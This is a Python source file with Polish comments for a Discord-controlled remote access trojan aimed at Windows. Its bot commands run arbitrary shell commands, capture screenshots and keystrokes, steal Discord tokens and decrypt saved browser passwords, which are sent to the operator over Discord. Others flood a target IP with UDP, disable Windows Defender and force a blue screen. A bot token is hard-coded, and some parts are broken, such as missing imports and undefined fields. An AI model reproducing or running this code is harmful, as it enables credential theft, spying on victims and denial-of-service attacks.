import discord
from discord.ext import commands
import os
import platform
import psutil
import pyautogui
import subprocess
import asyncio
import requests
import re
import json
import base64
import winreg as reg
import ctypes
import shutil
import sys
import time
import threading
import getpass
import cv2
from pynput import keyboard
from PIL import ImageGrab
import numpy as np
import sounddevice as sd
import wave
import sqlite3
import urllib.request
import browser_cookie3

# Inicjalizacja bota
intents = discord.Intents.default()
intents.message_content = True
intents.guild_messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Zmienna globalna
key_log = []
keylog_listener = None
reverse_mouse = False

# Funkcja sprawdzania administratora
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

# Informacje o systemie
def get_system_info():
    pc_name = platform.node()
    ip_address = requests.get("https://api.ipify.org").text 
    system_version = platform.platform()
    cpu_usage = f"{psutil.cpu_percent()}%"
    memory = psutil.virtual_memory()
    ram_usage = f"{memory.percent}%"
    disk = psutil.disk_usage('/')
    disk_usage = f"{disk.percent}% used of {disk.total // (1024 ** 3)} GB"
    return {
        "PC Name": pc_name,
        "IP Address": ip_address,
        "System Version": system_version,
        "CPU Usage": cpu_usage,
        "RAM Usage": ram_usage,
        "Disk Info": disk_usage
    }

# Komenda: !information
@bot.command()
async def information(ctx):
    info = get_system_info()
    embed = discord.Embed(title="🖥️ System Information", color=discord.Color.green())
    for key, value in info.items():
        embed.add_field(name=key, value=value, inline=False)
    await ctx.send(embed=embed)

# Komenda: !screen – zrzut ekranu
@bot.command()
async def screen(ctx):
    screenshot_path = os.path.join(os.getenv("TEMP"), "screenshot.png")
    img = ImageGrab.grab()
    img.save(screenshot_path)
    await ctx.send(file=discord.File(screenshot_path))
    os.remove(screenshot_path)

# Komenda: !exec – wykonanie komendy CMD / PowerShell
@bot.command()
async def exec(ctx, *, cmd: str):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    result = proc.stdout.read() + proc.stderr.read()
    result_str = result.decode('utf-8', errors='ignore')
    await ctx.send(f"```\n{result_str[:1900]}\n```")

# Komenda: !battery – stan baterii
@bot.command()
async def battery(ctx):
    battery = psutil.sensors_battery()
    percent = battery.percent if battery else "N/A"
    plugged = battery.power_plugged if battery else "N/A"
    await ctx.send(f"Bateria: {percent}%, Podłączony: {'Tak' if plugged else 'Nie'}")

# Komenda: !ram – użycie pamięci
@bot.command()
async def ram(ctx):
    mem = psutil.virtual_memory()
    await ctx.send(f"🧠 RAM: {mem.percent}%")

# Komenda: !cpu – obciążenie CPU
@bot.command()
async def cpu(ctx):
    usage = psutil.cpu_percent(interval=1)
    await ctx.send(f"⚙️ CPU: {usage}%")

# Komenda: !disk – dane dyskowe
@bot.command()
async def disk(ctx):
    disk = psutil.disk_usage('/')
    await ctx.send(f"📦 Dysk: {disk.percent}% użytego z {disk.total // (1024 ** 3)} GB")

# Komenda: !geolocation – lokalizacja geograficzna
@bot.command()
async def geolocation(ctx):
    response = requests.get("https://ipinfo.io/json").json() 
    await ctx.send(f"📍 Lokalizacja: {response}")

# Komenda: !reboot – restart systemu
@bot.command()
async def reboot(ctx):
    await ctx.send("🔄 Restartowanie systemu...")
    os.system("shutdown /r /t 0")

# Komenda: !logout – wylogowanie użytkownika
@bot.command()
async def logout(ctx):
    await ctx.send("🔒 Wylogowywanie...")
    ctypes.windll.user32.LockWorkStation()

# Komenda: !keylog_start – start keylogera
def on_press(key):
    global key_log
    key_log.append(str(key))

@bot.command()
async def keylog_start(ctx):
    global keylog_listener
    if keylog_listener is None:
        keylog_listener = keyboard.Listener(on_press=on_press)
        keylog_listener.start()
        await ctx.send("⌨️ Keylogger uruchomiony!")

# Komenda: !keylog_stop – stop keylogerowi
@bot.command()
async def keylog_stop(ctx):
    global keylog_listener
    if keylog_listener and keylog_listener.is_alive():
        keylog_listener.stop()
        keylog_listener = None
        await ctx.send("🛑 Keylogger zatrzymany.")
        with open("keylog.txt", "w") as f:
            f.write("\n".join(key_log))
        await ctx.send(file=discord.File("keylog.txt"))
        os.remove("keylog.txt")
        key_log.clear()

# Komenda: !tokens – kradzież tokenów Discord
@bot.command()
async def tokens(ctx):
    tokens = []

    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")

    paths = {
        'Discord': os.path.join(roaming, 'Discord', 'Local Storage', 'leveldb'),
        'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
    }

    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        try:
            for file in os.listdir(path):
                if file.endswith('.log') or file.endswith('.ldb'):
                    with open(os.path.join(path, file), errors='ignore') as f:
                        lines = f.readlines()
                        for line in lines:
                            match = re.findall(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", line)
                            if match:
                                tokens.extend(match)
        except Exception as e:
            pass

    if tokens:
        unique_tokens = list(set(tokens))
        embed = discord.Embed(title="🔑 Znalezione tokeny Discord", color=discord.Color.red())
        for token in unique_tokens:
            embed.add_field(name="Token", value=f"``{token}``", inline=False)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="❌ Brak tokenów", description="Nie znaleziono żadnych tokenów.", color=discord.Color.dark_red())
        await ctx.send(embed=embed)

# Komenda: !hasła – kradzież haseł z przeglądarek
BROWSERS = {
    "chrome": {
        "path": os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data'),
        "profiles": r"Default|Guest Profile|Profile \d+",
        "login_db": r"Login Data"
    },
    "edge": {
        "path": os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data'),
        "profiles": r"Default|Guest Profile|Profile \d+",
        "login_db": r"Login Data"
    },
    "brave": {
        "path": os.path.expanduser(r'~\AppData\Local\BraveSoftware\Brave-Browser\User Data'),
        "profiles": r"Default|Guest Profile|Profile \d+",
        "login_db": r"Login Data"
    }
}

# 🔑 Odszyfrowywanie hasła z przeglądarki
def get_master_key(browser_path):
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = ctypes.WinDLL('crypt32.dll').CryptUnprotectData(
            ctypes.c_char_p(encrypted_key),
            None, None, None, None, 0
        )[1]
        return master_key
    except:
        return None

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except:
        return "Nieznane"

def get_browser_passwords(browser_name, data):
    passwords = []
    browser_path = data["path"]
    profile_pattern = data["profiles"]

    if not os.path.exists(browser_path):
        return []

    profiles = [f for f in os.listdir(browser_path) if re.match(profile_pattern, f)]
    for profile in profiles:
        db_path = os.path.join(browser_path, profile, "Login Data")
        if not os.path.exists(db_path):
            continue
        temp_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_{profile}_Login_Data.db")
        shutil.copy2(db_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        master_key = get_master_key(browser_path)
        if not master_key:
            conn.close()
            os.remove(temp_db)
            continue

        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]

            decrypted_password = decrypt_password(encrypted_password, master_key)

            passwords.append({
                "url": url,
                "username": username,
                "password": decrypted_password
            })

        conn.close()
        os.remove(temp_db)

    return passwords

@bot.command()
async def hasła(ctx):
    all_passwords = []
    for browser_name, data in BROWSERS.items():
        passwords = get_browser_passwords(browser_name, data)
        all_passwords.extend(passwords)

    if all_passwords:
        output = "**🔐 Znalezione hasła:**\n\n"
        for entry in all_passwords:
            output += (
                f"🌐 Strona: {entry['url']}\n"
                f"👤 Login: {entry['username']}\n"
                f"🔑 Hasło: {entry['password']}\n"
                f"🧭 Przeglądarka: {entry['browser']} ({entry['profile']})\n"
                f"{'-' * 30}\n"
            )
        await ctx.send(output[:1900])
    else:
        await ctx.send("[+] Nie znaleziono żadnych haseł.")

# Komenda: !ddos – atak DDoS
@bot.command()
async def ddos(ctx, ip: str, duration: int):
    async def flood(ip, port, duration):
        end = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = b'\x00' * 65507
        while time.time() < end:
            sock.sendto(packet, (ip, 80))
        sock.close()
        await ctx.send(f"💥 Atak DDoS na `{ip}` zakończony.")

    await ctx.send(f"💥 Uruchamianie ataku DDoS na `{ip}` przez `{duration}s`...")
    await flood(ip, 80, duration)

# Komenda: !disabledefender – wyłączenie Windows Defender
@bot.command()
async def disabledefender(ctx):
    if is_admin():
        try:
            os.system("sc stop WinDefend >nul & sc config WinDefend start=disabled >nul")
            await ctx.send("🛡️ Windows Defender został wyłączony!")
        except Exception as e:
            await ctx.send(f"[!] Błąd: {str(e)}")
    else:
        await ctx.send("⚠️ Wymagane uprawnienia administratora!")

# Komenda: !bsod – wywołanie BSOD
@bot.command()
async def bsod(ctx):
    if is_admin():
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        await ctx.send("💥 Wywołano BSOD!")
    else:
        await ctx.send("⚠️ Wymagane uprawnienia administratora!")

# Komenda: !help – lista komend
@bot.command()
async def help(ctx):
    embed = discord.Embed(title="📚 Lista komend", color=discord.Color.blue())
    embed.add_field(name="!information", value="Informacje o systemie", inline=False)
    embed.add_field(name="!hasła", value="Kradzież haseł z przeglądarki", inline=False)
    embed.add_field(name="!tokens", value="Kradzież tokenów Discord", inline=False)
    embed.add_field(name="!screen", value="Zrzut ekranu", inline=False)
    embed.add_field(name="!exec", value="Wykonaj komendę", inline=False)
    embed.add_field(name="!battery", value="Stan baterii", inline=False)
    embed.add_field(name="!ram", value="Użycie RAM", inline=False)
    embed.add_field(name="!cpu", value="Obciążenie CPU", inline=False)
    embed.add_field(name="!disk", value="Dane o dysku", inline=False)
    embed.add_field(name="!geolocation", value="Lokalizacja geograficzna", inline=False)
    embed.add_field(name="!reboot", value="Restartuj system", inline=False)
    embed.add_field(name="!logout", value="Wyloguj użytkownika", inline=False)
    embed.add_field(name="!keylog_start / stop", value="Keylogger", inline=False)
    embed.add_field(name="!ddos <ip> <czas>", value="DDoS attack", inline=False)
    embed.add_field(name="!disabledefender", value="Wyłącz Windows Defender", inline=False)
    embed.add_field(name="!bsod", value="Wywołaj BSOD", inline=False)
    await ctx.send(embed=embed)

# Uruchomienie bota
bot.run("MTM3ODE4MjU1ODY4ODQ4MTQ0MQ.GeAvY6.755FnZgrSHvzPrubjHArq7x_254CL9zzwtMzY0")
